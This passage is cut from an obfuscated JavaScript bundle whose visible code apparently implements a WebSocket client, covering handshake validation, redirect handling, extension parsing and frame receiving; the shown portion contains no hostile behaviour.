                                    ..._0x58d057,
                                    'headers': {}
                                }, _0x2dd8a3) {
                                for (const [_0x309a7a, _0x37326f] of Object['entries'](_0x2dd8a3)) _0x58d057[_0x47a76e(0x384)][_0x309a7a[_0x47a76e(0x37a)]()] = _0x37326f;
                            }
                        } else {
                            if (0x0 === _0x2e6f64[_0x47a76e(0x1d1)](_0x47a76e(0x300))) {
                                const _0x3bd18e = _0x264225 ? !!_0x2e6f64['_originalIpc'] && _0x4b8bb2[_0x47a76e(0x35a)] === _0x2e6f64[_0x47a76e(0x2cd)] : !_0x2e6f64[_0x47a76e(0x258)] && _0x2e3f7d['host'] === _0x2e6f64['_originalHostOrSocketPath'];
                                (!_0x3bd18e || _0x2e6f64[_0x47a76e(0x239)] && !_0x12b9ab) && (delete _0x4b8bb2[_0x47a76e(0x384)][_0x47a76e(0x1d5)], delete _0x4b8bb2['headers'][_0x47a76e(0x3b1)], _0x3bd18e || delete _0x4b8bb2[_0x47a76e(0x384)]['host'], _0x4b8bb2[_0x47a76e(0x28f)] = void 0x0);
                            }
                        }
                        _0x4b8bb2[_0x47a76e(0x28f)] && !_0x58d057[_0x47a76e(0x384)][_0x47a76e(0x1d5)] && (_0x58d057[_0x47a76e(0x384)][_0x47a76e(0x1d5)] = _0x47a76e(0x370) + Buffer[_0x47a76e(0x316)](_0x4b8bb2[_0x47a76e(0x28f)])[_0x47a76e(0x38e)](_0x47a76e(0x2b9))), _0x1d28c4 = _0x2e6f64[_0x47a76e(0x308)] = _0x454b70(_0x4b8bb2), _0x2e6f64[_0x47a76e(0x3a8)] && _0x2e6f64['emit'](_0x47a76e(0x300), _0x2e6f64['url'], _0x1d28c4);
                    } else _0x1d28c4 = _0x2e6f64['_req'] = _0x454b70(_0x4b8bb2);
                    _0x4b8bb2['timeout'] && _0x1d28c4['on'](_0x47a76e(0x34b), () => {
                        const _0xfa3745 = _0x47a76e;
                        _0x4da4dd(_0x2e6f64, _0x1d28c4, _0xfa3745(0x257));
                    }), _0x1d28c4['on'](_0x47a76e(0x2ee), _0x5933f7 => {
                        const _0x4b9484 = _0x47a76e;
                        null === _0x1d28c4 || _0x1d28c4[_0x5aab1a] || (_0x1d28c4 = _0x2e6f64[_0x4b9484(0x308)] = null, _0x5d6610(_0x2e6f64, _0x5933f7));
                    }), _0x1d28c4['on'](_0x47a76e(0x1f3), _0x28c0c9 => {
                        const _0x4b909f = _0x47a76e,
                            _0x148eae = _0x28c0c9[_0x4b909f(0x384)][_0x4b909f(0x2c9)],
                            _0xe4e0f = _0x28c0c9[_0x4b909f(0x273)];
                        if (_0x148eae && _0x4b8bb2['followRedirects'] && _0xe4e0f >= 0x12c && _0xe4e0f < 0x190) {
                            if (++_0x2e6f64['_redirects'] > _0x4b8bb2['maxRedirects']) return void _0x4da4dd(_0x2e6f64, _0x1d28c4, 'Maximum redirects exceeded');
                            let _0x4f9ca5;
                            _0x1d28c4[_0x4b909f(0x216)]();
                            try {
                                _0x4f9ca5 = new _0x41f207(_0x148eae, _0x45b5b8);
                            } catch (_0x7e29b8) {
                                const _0x12a426 = new SyntaxError(_0x4b909f(0x2be) + _0x148eae);
                                return void _0x5d6610(_0x2e6f64, _0x12a426);
                            }
                            _0x31ff79(_0x2e6f64, _0x4f9ca5, _0x533028, _0x58d057);
                        } else _0x2e6f64['emit']('unexpected-response', _0x1d28c4, _0x28c0c9) || _0x4da4dd(_0x2e6f64, _0x1d28c4, _0x4b909f(0x3a5) + _0x28c0c9[_0x4b909f(0x273)]);
                    }), _0x1d28c4['on'](_0x47a76e(0x35d), (_0x307c97, _0x27110d, _0x224133) => {
                        const _0x315a61 = _0x47a76e;
                        if (_0x2e6f64[_0x315a61(0x31d)](_0x315a61(0x35d), _0x307c97), _0x2e6f64[_0x315a61(0x36a)] !== _0x36a426[_0x315a61(0x27f)]) return;
                        _0x1d28c4 = _0x2e6f64['_req'] = null;
                        const _0x35ecd5 = _0x307c97[_0x315a61(0x384)]['upgrade'];
                        if (void 0x0 === _0x35ecd5 || _0x315a61(0x290) !== _0x35ecd5[_0x315a61(0x37a)]()) return void _0x4da4dd(_0x2e6f64, _0x27110d, _0x315a61(0x312));
                        const _0x2ca5a5 = _0x2ab17e(_0x315a61(0x32e))[_0x315a61(0x2e1)](_0x38daf5 + _0x4b9e8d)[_0x315a61(0x1c7)](_0x315a61(0x2b9));
                        if (_0x307c97[_0x315a61(0x384)][_0x315a61(0x2c4)] !== _0x2ca5a5) return void _0x4da4dd(_0x2e6f64, _0x27110d, _0x315a61(0x2b5));
                        const _0x320174 = _0x307c97[_0x315a61(0x384)][_0x315a61(0x327)];
                        let _0x22b26b;
                        if (void 0x0 !== _0x320174 ? _0x5d9a12[_0x315a61(0x35f)] ? _0x5d9a12['has'](_0x320174) || (_0x22b26b = _0x315a61(0x248)) : _0x22b26b = _0x315a61(0x1c9) : _0x5d9a12[_0x315a61(0x35f)] && (_0x22b26b = 'Server sent no subprotocol'), _0x22b26b) return void _0x4da4dd(_0x2e6f64, _0x27110d, _0x22b26b);
                        _0x320174 && (_0x2e6f64[_0x315a61(0x259)] = _0x320174);
                        const _0x2ce01d = _0x307c97[_0x315a61(0x384)][_0x315a61(0x27d)];
                        if (void 0x0 !== _0x2ce01d) {
                            if (!_0x3cc4ce) return void _0x4da4dd(_0x2e6f64, _0x27110d, 'Server sent a Sec-WebSocket-Extensions header but no extension was requested');
                            let _0x50cc4f;
                            try {
                                _0x50cc4f = _0x252392(_0x2ce01d);
                            } catch (_0x507f25) {
                                return void _0x4da4dd(_0x2e6f64, _0x27110d, _0x315a61(0x3a1));
                            }
                            const _0x1185ca = Object[_0x315a61(0x2e5)](_0x50cc4f);
                            if (0x1 !== _0x1185ca[_0x315a61(0x265)] || _0x1185ca[0x0] !== _0x4f9d70[_0x315a61(0x2ad)]) return void _0x4da4dd(_0x2e6f64, _0x27110d, 'Server indicated an extension that was not requested');
                            try {
                                _0x3cc4ce[_0x315a61(0x276)](_0x50cc4f[_0x4f9d70[_0x315a61(0x2ad)]]);
                            } catch (_0x5866d6) {
                                return void _0x4da4dd(_0x2e6f64, _0x27110d, _0x315a61(0x3a1));
                            }
                            _0x2e6f64[_0x315a61(0x2dc)][_0x4f9d70['extensionName']] = _0x3cc4ce;
                        }
                        _0x2e6f64[_0x315a61(0x236)](_0x27110d, _0x224133, {
                            'allowSynchronousEvents': _0x4b8bb2[_0x315a61(0x2ff)],
                            'generateMask': _0x4b8bb2[_0x315a61(0x222)],
                            'maxPayload': _0x4b8bb2[_0x315a61(0x288)],
                            'skipUTF8Validation': _0x4b8bb2[_0x315a61(0x293)]
                        });
                    }), _0x4b8bb2['finishRequest'] ? _0x4b8bb2[_0x47a76e(0x202)](_0x1d28c4, _0x2e6f64) : _0x1d28c4['end']();
                }

                function _0x5d6610(_0x1e2126, _0x3a67b) {
                    const _0x10b325 = _0x5f1618;
                    _0x1e2126[_0x10b325(0x2ba)] = _0x36a426['CLOSING'], _0x1e2126[_0x10b325(0x233)] = !0x0, _0x1e2126[_0x10b325(0x31d)](_0x10b325(0x2ee), _0x3a67b), _0x1e2126[_0x10b325(0x3b2)]();
                }

                function _0x5b63a8(_0x200916) {
                    return _0x200916['path'] = _0x200916['socketPath'], _0x30bc10['connect'](_0x200916);
                }

                function _0x3b319d(_0x4aa900) {
                    const _0x488f32 = _0x5f1618;
                    return _0x4aa900['path'] = void 0x0, _0x4aa900[_0x488f32(0x30f)] || '' === _0x4aa900[_0x488f32(0x30f)] || (_0x4aa900['servername'] = _0x30bc10['isIP'](_0x4aa900[_0x488f32(0x294)]) ? '' : _0x4aa900['host']), _0x3c8c34[_0x488f32(0x26f)](_0x4aa900);
                }

                function _0x4da4dd(_0x108ec5, _0x272a4b, _0x29daea) {
                    const _0x21d032 = _0x5f1618;
                    _0x108ec5['_readyState'] = _0x36a426[_0x21d032(0x314)];
                    const _0x24429d = new Error(_0x29daea);
                    Error[_0x21d032(0x2ce)](_0x24429d, _0x4da4dd), _0x272a4b[_0x21d032(0x347)] ? (_0x272a4b[_0x5aab1a] = !0x0, _0x272a4b[_0x21d032(0x216)](), _0x272a4b['socket'] && !_0x272a4b[_0x21d032(0x323)][_0x21d032(0x328)] && _0x272a4b[_0x21d032(0x323)]['destroy'](), process['nextTick'](_0x5d6610, _0x108ec5, _0x24429d)) : (_0x272a4b['destroy'](_0x24429d), _0x272a4b[_0x21d032(0x2f8)](_0x21d032(0x2ee), _0x108ec5[_0x21d032(0x31d)][_0x21d032(0x30c)](_0x108ec5, 'error')), _0x272a4b[_0x21d032(0x2f8)]('close', _0x108ec5['emitClose'][_0x21d032(0x30c)](_0x108ec5)));
                }

                function _0x5587cf(_0xc0140, _0xa23fd7, _0xc0de8) {
                    const _0x3e3685 = _0x5f1618;
                    if (_0xa23fd7) {
                        const _0x1a7771 = _0x30ee55(_0xa23fd7) ? _0xa23fd7[_0x3e3685(0x35f)] : _0x5bb4eb(_0xa23fd7)[_0x3e3685(0x265)];
                        _0xc0140[_0x3e3685(0x37b)] ? _0xc0140['_sender']['_bufferedBytes'] += _0x1a7771 : _0xc0140[_0x3e3685(0x2a7)] += _0x1a7771;
                    }
                    if (_0xc0de8) {
                        const _0x5b93a0 = new Error(_0x3e3685(0x355) + _0xc0140[_0x3e3685(0x36a)] + ' (' + _0x8713c0[_0xc0140[_0x3e3685(0x36a)]] + ')');
                        process[_0x3e3685(0x39e)](_0xc0de8, _0x5b93a0);
                    }
                }

                function _0x1efe7a(_0x2a68f1, _0x2b0e62) {
                    const _0x2b137b = _0x5f1618,
                        _0x195c52 = this[_0x3882d6];
                    _0x195c52['_closeFrameReceived'] = !0x0, _0x195c52['_closeMessage'] = _0x2b0e62, _0x195c52[_0x2b137b(0x254)] = _0x2a68f1, void 0x0 !== _0x195c52['_socket'][_0x3882d6] && (_0x195c52[_0x2b137b(0x37b)][_0x2b137b(0x1eb)]('data', _0x251ef5), process[_0x2b137b(0x39e)](_0x9368c0, _0x195c52[_0x2b137b(0x37b)]), 0x3ed === _0x2a68f1 ? _0x195c52['close']() : _0x195c52[_0x2b137b(0x2b4)](_0x2a68f1, _0x2b0e62));
                }

                function _0x44b4cc() {
                    const _0x2fdf3a = _0x5f1618,
                        _0x3c5a31 = this[_0x3882d6];
                    _0x3c5a31[_0x2fdf3a(0x326)] || _0x3c5a31[_0x2fdf3a(0x37b)][_0x2fdf3a(0x2fd)]();
                }

                function _0x5335d2(_0x2ebf7e) {
                    const _0x126e51 = _0x5f1618,
                        _0x3e38ac = this[_0x3882d6];
                    void 0x0 !== _0x3e38ac[_0x126e51(0x37b)][_0x3882d6] && (_0x3e38ac['_socket'][_0x126e51(0x1eb)](_0x126e51(0x387), _0x251ef5), process[_0x126e51(0x39e)](_0x9368c0, _0x3e38ac['_socket']), _0x3e38ac[_0x126e51(0x2b4)](_0x2ebf7e[_0x484f80])), _0x3e38ac[_0x126e51(0x233)] || (_0x3e38ac[_0x126e51(0x233)] = !0x0, _0x3e38ac['emit']('error', _0x2ebf7e));
                }

                function _0x1dabc0() {
                    const _0x2af49a = _0x5f1618;
                    this[_0x3882d6][_0x2af49a(0x3b2)]();
                }

                function _0x519997(_0x4b4a05, _0x247bce) {
                    const _0xa11c1f = _0x5f1618;
                    this[_0x3882d6]['emit'](_0xa11c1f(0x37e), _0x4b4a05, _0x247bce);
                }

                function _0x167bec(_0xfba82b) {
                    const _0x32770c = _0x5f1618,
                        _0x39e9f1 = this[_0x3882d6];
                    _0x39e9f1[_0x32770c(0x321)] && _0x39e9f1[_0x32770c(0x229)](_0xfba82b, !this[_0x32770c(0x34a)], _0x495bad), _0x39e9f1['emit'](_0x32770c(0x266), _0xfba82b);
                }

                function _0x124de4(_0x31bae8) {
                    const _0x13f620 = _0x5f1618;
                    this[_0x3882d6][_0x13f620(0x31d)](_0x13f620(0x229), _0x31bae8);
                }

                function _0x9368c0(_0x7d5893) {
                    const _0x30de2f = _0x5f1618;
                    _0x7d5893[_0x30de2f(0x2fd)]();
                }

                function _0x2b7864(_0x5612be) {
                    const _0x2a072d = _0x5f1618,
                        _0x29bacd = this[_0x3882d6];
                    _0x29bacd[_0x2a072d(0x36a)] !== _0x36a426[_0x2a072d(0x2bf)] && (_0x29bacd[_0x2a072d(0x36a)] === _0x36a426[_0x2a072d(0x296)] && (_0x29bacd[_0x2a072d(0x2ba)] = _0x36a426['CLOSING'], _0x20f1e4(_0x29bacd)), this[_0x2a072d(0x37b)][_0x2a072d(0x362)](), _0x29bacd[_0x2a072d(0x233)] || (_0x29bacd['_errorEmitted'] = !0x0, _0x29bacd[_0x2a072d(0x31d)](_0x2a072d(0x2ee), _0x5612be)));
                }

                function _0x20f1e4(_0xd943bf) {
                    const _0x4c9fe8 = _0x5f1618;
                    _0xd943bf['_closeTimer'] = setTimeout(_0xd943bf['_socket']['destroy'][_0x4c9fe8(0x30c)](_0xd943bf['_socket']), 0x7530);
                }

                function _0xd764f7() {
                    const _0x5d3758 = _0x5f1618,
                        _0x3b5960 = this[_0x3882d6];
                    let _0x557bbb;
                    this[_0x5d3758(0x1eb)](_0x5d3758(0x2b4), _0xd764f7), this['removeListener']('data', _0x251ef5), this[_0x5d3758(0x1eb)](_0x5d3758(0x362), _0x42a46d), _0x3b5960[_0x5d3758(0x2ba)] = _0x36a426['CLOSING'], this[_0x5d3758(0x250)][_0x5d3758(0x234)] || _0x3b5960[_0x5d3758(0x1f7)] || _0x3b5960['_receiver'][_0x5d3758(0x1d9)][_0x5d3758(0x2c6)] || null === (_0x557bbb = _0x3b5960[_0x5d3758(0x37b)][_0x5d3758(0x379)]()) || _0x3b5960['_receiver']['write'](_0x557bbb), _0x3b5960[_0x5d3758(0x22a)]['end'](), this[_0x3882d6] = void 0x0, clearTimeout(_0x3b5960['_closeTimer']), _0x3b5960[_0x5d3758(0x22a)][_0x5d3758(0x1d9)][_0x5d3758(0x304)] || _0x3b5960['_receiver'][_0x5d3758(0x1d9)][_0x5d3758(0x2c6)] ? _0x3b5960[_0x5d3758(0x3b2)]() : (_0x3b5960[_0x5d3758(0x22a)]['on'](_0x5d3758(0x2ee), _0x1dabc0), _0x3b5960['_receiver']['on'](_0x5d3758(0x371), _0x1dabc0));
                }

                function _0x251ef5(_0x286ae6) {
                    const _0x638c28 = _0x5f1618;
                    this[_0x3882d6][_0x638c28(0x22a)]['write'](_0x286ae6) || this[_0x638c28(0x243)]();
                }

                function _0x42a46d() {
                    const _0x4ac5f3 = _0x5f1618,
                        _0x4a804c = this[_0x3882d6];
                    _0x4a804c[_0x4ac5f3(0x2ba)] = _0x36a426[_0x4ac5f3(0x314)], _0x4a804c[_0x4ac5f3(0x22a)][_0x4ac5f3(0x362)](), this[_0x4ac5f3(0x362)]();
                }

                function _0x3c1c06() {
                    const _0x4521a3 = _0x5f1618,
                        _0x468dc2 = this[_0x3882d6];
                    this[_0x4521a3(0x1eb)](_0x4521a3(0x2ee), _0x3c1c06), this['on']('error', _0x495bad), _0x468dc2 && (_0x468dc2[_0x4521a3(0x2ba)] = _0x36a426['CLOSING'], this[_0x4521a3(0x2ea)]());
                }
                Object[_0x5f1618(0x1f4)](_0x36a426, _0x5f1618(0x27f), {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)]('CONNECTING')
                }), Object[_0x5f1618(0x1f4)](_0x36a426[_0x5f1618(0x24a)], _0x5f1618(0x27f), {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)](_0x5f1618(0x27f))
                }), Object[_0x5f1618(0x1f4)](_0x36a426, _0x5f1618(0x296), {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)](_0x5f1618(0x296))
                }), Object[_0x5f1618(0x1f4)](_0x36a426['prototype'], _0x5f1618(0x296), {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)](_0x5f1618(0x296))
                }), Object[_0x5f1618(0x1f4)](_0x36a426, _0x5f1618(0x314), {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)](_0x5f1618(0x314))
                }), Object[_0x5f1618(0x1f4)](_0x36a426[_0x5f1618(0x24a)], 'CLOSING', {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)]('CLOSING')
                }), Object[_0x5f1618(0x1f4)](_0x36a426, _0x5f1618(0x2bf), {
                    'enumerable': !0x0,
                    'value': _0x8713c0['indexOf']('CLOSED')
                }), Object['defineProperty'](_0x36a426['prototype'], 'CLOSED', {
                    'enumerable': !0x0,
                    'value': _0x8713c0[_0x5f1618(0x261)](_0x5f1618(0x2bf))
                }), [_0x5f1618(0x2a9), _0x5f1618(0x36b), _0x5f1618(0x369), _0x5f1618(0x326), 'protocol', _0x5f1618(0x36a), 'url'][_0x5f1618(0x280)](_0xd7ac11 => {
                    const _0x5c036e = _0x5f1618;
                    Object[_0x5c036e(0x1f4)](_0x36a426['prototype'], _0xd7ac11, {
                        'enumerable': !0x0
                    });
                }), [_0x5f1618(0x31a), 'error', _0x5f1618(0x2b4), _0x5f1618(0x37e)]['forEach'](_0xa48031 => {
                    const _0x59d842 = _0x5f1618;
                    Object[_0x59d842(0x1f4)](_0x36a426[_0x59d842(0x24a)], 'on' + _0xa48031, {
                        'enumerable': !0x0,
                        'get'() {
                            for (const _0x56cd77 of this['listeners'](_0xa48031))
                                if (_0x56cd77[_0x2e5338]) return _0x56cd77[_0x1dfdf5];
                            return null;
                        },
                        'set'(_0x8d20d5) {
                            const _0x2c88d9 = _0x59d842;
                            for (const _0x40860a of this[_0x2c88d9(0x2ef)](_0xa48031))
                                if (_0x40860a[_0x2e5338]) {
                                    this['removeListener'](_0xa48031, _0x40860a);
                                    break;
                                }
                            'function' == typeof _0x8d20d5 && this[_0x2c88d9(0x2c3)](_0xa48031, _0x8d20d5, {
                                [_0x2e5338]: !0x0
                            });
                        }
                    });
                }), _0x36a426[_0x5f1618(0x24a)][_0x5f1618(0x2c3)] = _0x1cf6d2, _0x36a426[_0x5f1618(0x24a)][_0x5f1618(0x35e)] = _0xd381d2, _0x38aad3[_0x5f1618(0x291)] = _0x36a426;
            },
            0x6a(_0xe1e6aa) {
                'use strict';
                const _0x4e59e9 = a0_0x2568;
                _0xe1e6aa[_0x4e59e9(0x291)] = require(_0x4e59e9(0x2cb));
            },
            0xb5(_0x2f3e5a) {
                'use strict';
                const _0x417098 = a0_0x2568;
                _0x2f3e5a[_0x417098(0x291)] = require(_0x417098(0x27c));
            },
            0xcb(_0x2e8567) {
                'use strict';
                const _0x4c7b4e = a0_0x2568;
                _0x2e8567[_0x4c7b4e(0x291)] = require(_0x4c7b4e(0x359));
            },
            0xed(_0x1d9f41, _0x40d124, _0x457e22) {
                'use strict';
                const _0xe8e25c = a0_0x2568;
                const {
                    tokenChars: _0x1dad69
                } = _0x457e22(0x370);
                _0x1d9f41[_0xe8e25c(0x291)] = {
                    'parse': function (_0x5913a7) {
                        const _0x566c1e = _0xe8e25c,
                            _0x2e8e09 = new Set();
                        let _0x1be60f = -0x1,
                            _0x26c815 = -0x1,
                            _0x4b161f = 0x0;
                        for (; _0x4b161f < _0x5913a7[_0x566c1e(0x265)]; _0x4b161f++) {
                            const _0x4b719d = _0x5913a7[_0x566c1e(0x2d2)](_0x4b161f);
                            if (-0x1 === _0x26c815 && 0x1 === _0x1dad69[_0x4b719d]) - 0x1 === _0x1be60f && (_0x1be60f = _0x4b161f);
                            else {
                                if (0x0 === _0x4b161f || 0x20 !== _0x4b719d && 0x9 !== _0x4b719d) {
                                    if (0x2c !== _0x4b719d) throw new SyntaxError('Unexpected character at index ' + _0x4b161f); {
                                        if (-0x1 === _0x1be60f) throw new SyntaxError(_0x566c1e(0x2fb) + _0x4b161f); - 0x1 === _0x26c815 && (_0x26c815 = _0x4b161f);
                                        const _0x1b9082 = _0x5913a7['slice'](_0x1be60f, _0x26c815);
                                        if (_0x2e8e09['has'](_0x1b9082)) throw new SyntaxError('The \"' + _0x1b9082 + _0x566c1e(0x37f));
                                        _0x2e8e09['add'](_0x1b9082), _0x1be60f = _0x26c815 = -0x1;
                                    }
                                } else -0x1 === _0x26c815 && -0x1 !== _0x1be60f && (_0x26c815 = _0x4b161f);
                            }
                        }
                        if (-0x1 === _0x1be60f || -0x1 !== _0x26c815) throw new SyntaxError(_0x566c1e(0x315));
                        const _0x589526 = _0x5913a7['slice'](_0x1be60f, _0x4b161f);
                        if (_0x2e8e09[_0x566c1e(0x399)](_0x589526)) throw new SyntaxError(_0x566c1e(0x1e4) + _0x589526 + _0x566c1e(0x37f));
                        return _0x2e8e09[_0x566c1e(0x20d)](_0x589526), _0x2e8e09;
                    }
                };
            },
            0x116(_0x16a3ff) {
                'use strict';
                const _0x198edb = a0_0x2568;
                _0x16a3ff['exports'] = require(_0x198edb(0x2f1));
            },
            0x11e(_0x565ba5, _0x1b727f, _0x3c9930) {
                'use strict';
                const _0x2b7b09 = a0_0x2568;
                const {
                    Writable: _0x53e526
                } = _0x3c9930(0xcb), _0x378fdb = _0x3c9930(0x3cb), {
                    BINARY_TYPES: _0x350317,
                    EMPTY_BUFFER: _0x55ff4d,
                    kStatusCode: _0x40b697,
                    kWebSocket: _0x3c0082
                } = _0x3c9930(0x266), {
                    concat: _0x49ba07,
                    toArrayBuffer: _0x1ccead,
                    unmask: _0x56ba4e
                } = _0x3c9930(0x152), {
                    isValidStatusCode: _0x4757f4,
                    isValidUTF8: _0x1d8b4e
                } = _0x3c9930(0x370), _0x53b42b = Buffer[Symbol[_0x2b7b09(0x295)]];
                _0x565ba5[_0x2b7b09(0x291)] = class extends _0x53e526 {
                    constructor(_0x10e470 = {}) {
                        const _0x30b221 = _0x2b7b09;
                        super(), this['_allowSynchronousEvents'] = void 0x0 === _0x10e470[_0x30b221(0x2ff)] || _0x10e470[_0x30b221(0x2ff)], this['_binaryType'] = _0x10e470[_0x30b221(0x2a9)] || _0x350317[0x0], this['_extensions'] = _0x10e470['extensions'] || {}, this[_0x30b221(0x34a)] = !!_0x10e470[_0x30b221(0x39d)], this[_0x30b221(0x325)] = 0x0 | _0x10e470['maxPayload'], this[_0x30b221(0x1d3)] = !!_0x10e470['skipUTF8Validation'], this[_0x3c0082] = void 0x0, this['_bufferedBytes'] = 0x0, this[_0x30b221(0x389)] = [], this[_0x30b221(0x319)] = !0x1, this[_0x30b221(0x226)] = 0x0, this[_0x30b221(0x391)] = void 0x0, this[_0x30b221(0x2f6)] = 0x0, this[_0x30b221(0x2e8)] = !0x1, this[_0x30b221(0x2f5)] = !0x1, this[_0x30b221(0x2d9)] = 0x0, this[_0x30b221(0x336)] = 0x0, this[_0x30b221(0x1d2)] = 0x0, this['_fragments'] = [], this['_errored'] = !0x1, this[_0x30b221(0x237)] = !0x1, this[_0x30b221(0x393)] = 0x0;
                    } [_0x2b7b09(0x396)](_0x1cc90a, _0xf04e25, _0xbc2cb) {
                        const _0x10b7eb = _0x2b7b09;
                        if (0x8 === this[_0x10b7eb(0x2d9)] && 0x0 == this['_state']) return _0xbc2cb();
                        this['_bufferedBytes'] += _0x1cc90a['length'], this['_buffers'][_0x10b7eb(0x1fe)](_0x1cc90a), this[_0x10b7eb(0x330)](_0xbc2cb);
                    } [_0x2b7b09(0x318)](_0x44fe1d) {
                        const _0x2dbfb0 = _0x2b7b09;
                        if (this[_0x2dbfb0(0x3a6)] -= _0x44fe1d, _0x44fe1d === this[_0x2dbfb0(0x389)][0x0][_0x2dbfb0(0x265)]) return this['_buffers']['shift']();
                        if (_0x44fe1d < this['_buffers'][0x0][_0x2dbfb0(0x265)]) {
                            const _0x24885e = this[_0x2dbfb0(0x389)][0x0];
                            return this['_buffers'][0x0] = new _0x53b42b(_0x24885e[_0x2dbfb0(0x27c)], _0x24885e[_0x2dbfb0(0x21e)] + _0x44fe1d, _0x24885e['length'] - _0x44fe1d), new _0x53b42b(_0x24885e[_0x2dbfb0(0x27c)], _0x24885e[_0x2dbfb0(0x21e)], _0x44fe1d);
                        }
                        const _0x77d0e9 = Buffer[_0x2dbfb0(0x21b)](_0x44fe1d);
                        do {
                            const _0xf7de0f = this[_0x2dbfb0(0x389)][0x0],
                                _0x492956 = _0x77d0e9['length'] - _0x44fe1d;
                            _0x44fe1d >= _0xf7de0f[_0x2dbfb0(0x265)] ? _0x77d0e9[_0x2dbfb0(0x30b)](this['_buffers'][_0x2dbfb0(0x27a)](), _0x492956) : (_0x77d0e9['set'](new Uint8Array(_0xf7de0f[_0x2dbfb0(0x27c)], _0xf7de0f['byteOffset'], _0x44fe1d), _0x492956), this[_0x2dbfb0(0x389)][0x0] = new _0x53b42b(_0xf7de0f[_0x2dbfb0(0x27c)], _0xf7de0f['byteOffset'] + _0x44fe1d, _0xf7de0f[_0x2dbfb0(0x265)] - _0x44fe1d)), _0x44fe1d -= _0xf7de0f[_0x2dbfb0(0x265)];
                        } while (_0x44fe1d > 0x0);
                        return _0x77d0e9;
                    } [_0x2b7b09(0x330)](_0x282d27) {
                        const _0x1299ee = _0x2b7b09;
                        this[_0x1299ee(0x237)] = !0x0;
                        do {
                            switch (this[_0x1299ee(0x393)]) {
                            case 0x0:
                                this[_0x1299ee(0x35b)](_0x282d27);
                                break;
                            case 0x1:
                                this['getPayloadLength16'](_0x282d27);
                                break;
                            case 0x2:
                                this[_0x1299ee(0x23e)](_0x282d27);
                                break;
                            case 0x3:
                                this[_0x1299ee(0x322)]();
                                break;
                            case 0x4:
                                this['getData'](_0x282d27);
                                break;
                            case 0x5:
                            case 0x6:
                                return void(this['_loop'] = !0x1);
                            }
                        } while (this['_loop']);
                        this[_0x1299ee(0x281)] || _0x282d27();
                    } [_0x2b7b09(0x35b)](_0x3e09a6) {
                        const _0x665637 = _0x2b7b09;
                        if (this[_0x665637(0x3a6)] < 0x2) return void(this[_0x665637(0x237)] = !0x1);
                        const _0x26861b = this[_0x665637(0x318)](0x2);
                        if (0x30 & _0x26861b[0x0]) return void _0x3e09a6(this['createError'](RangeError, _0x665637(0x377), !0x0, 0x3ea, _0x665637(0x331)));
                        const _0x7d288a = !(0x40 & ~_0x26861b[0x0]);
                        if (!_0x7d288a || this['_extensions'][_0x378fdb[_0x665637(0x2ad)]]) {
                            if (this[_0x665637(0x2f5)] = !(0x80 & ~_0x26861b[0x0]), this[_0x665637(0x2d9)] = 0xf & _0x26861b[0x0], this[_0x665637(0x226)] = 0x7f & _0x26861b[0x1], 0x0 === this[_0x665637(0x2d9)]) {
                                if (_0x7d288a) return void _0x3e09a6(this['createError'](RangeError, _0x665637(0x1e9), !0x0, 0x3ea, _0x665637(0x365)));
                                if (!this[_0x665637(0x2f6)]) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, _0x665637(0x372), !0x0, 0x3ea, _0x665637(0x334)));
                                this[_0x665637(0x2d9)] = this[_0x665637(0x2f6)];
                            } else {
                                if (0x1 === this[_0x665637(0x2d9)] || 0x2 === this['_opcode']) {
                                    if (this[_0x665637(0x2f6)]) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, _0x665637(0x1fa) + this[_0x665637(0x2d9)], !0x0, 0x3ea, _0x665637(0x334)));
                                    this['_compressed'] = _0x7d288a;
                                } else {
                                    if (!(this[_0x665637(0x2d9)] > 0x7 && this[_0x665637(0x2d9)] < 0xb)) return void _0x3e09a6(this['createError'](RangeError, _0x665637(0x1fa) + this['_opcode'], !0x0, 0x3ea, _0x665637(0x334)));
                                    if (!this[_0x665637(0x2f5)]) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, 'FIN must be set', !0x0, 0x3ea, _0x665637(0x28e)));
                                    if (_0x7d288a) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, 'RSV1 must be clear', !0x0, 0x3ea, 'WS_ERR_UNEXPECTED_RSV_1'));
                                    if (this['_payloadLength'] > 0x7d || 0x8 === this[_0x665637(0x2d9)] && 0x1 === this[_0x665637(0x226)]) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, _0x665637(0x375) + this['_payloadLength'], !0x0, 0x3ea, 'WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH'));
                                }
                            }
                            if (this[_0x665637(0x2f5)] || this[_0x665637(0x2f6)] || (this[_0x665637(0x2f6)] = this[_0x665637(0x2d9)]), this[_0x665637(0x2e8)] = !(0x80 & ~_0x26861b[0x1]), this[_0x665637(0x34a)]) {
                                if (!this[_0x665637(0x2e8)]) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, 'MASK must be set', !0x0, 0x3ea, _0x665637(0x302)));
                            } else {
                                if (this['_masked']) return void _0x3e09a6(this[_0x665637(0x306)](RangeError, _0x665637(0x231), !0x0, 0x3ea, 'WS_ERR_UNEXPECTED_MASK'));
                            }
                            0x7e === this['_payloadLength'] ? this[_0x665637(0x393)] = 0x1 : 0x7f === this[_0x665637(0x226)] ? this[_0x665637(0x393)] = 0x2 : this[_0x665637(0x1d6)](_0x3e09a6);
                        } else _0x3e09a6(this['createError'](RangeError, _0x665637(0x1e9), !0x0, 0x3ea, _0x665637(0x365)));
                    } [_0x2b7b09(0x208)](_0x1d0fd8) {
                        const _0x386473 = _0x2b7b09;
                        this['_bufferedBytes'] < 0x2 ? this['_loop'] = !0x1 : (this[_0x386473(0x226)] = this[_0x386473(0x318)](0x2)[_0x386473(0x36c)](0x0), this['haveLength'](_0x1d0fd8));
                    } [_0x2b7b09(0x23e)](_0xba64a8) {
                        const _0x3121cd = _0x2b7b09;
                        if (this[_0x3121cd(0x3a6)] < 0x8) return void(this[_0x3121cd(0x237)] = !0x1);
                        const _0x140ee0 = this[_0x3121cd(0x318)](0x8),
                            _0x36aeb6 = _0x140ee0['readUInt32BE'](0x0);
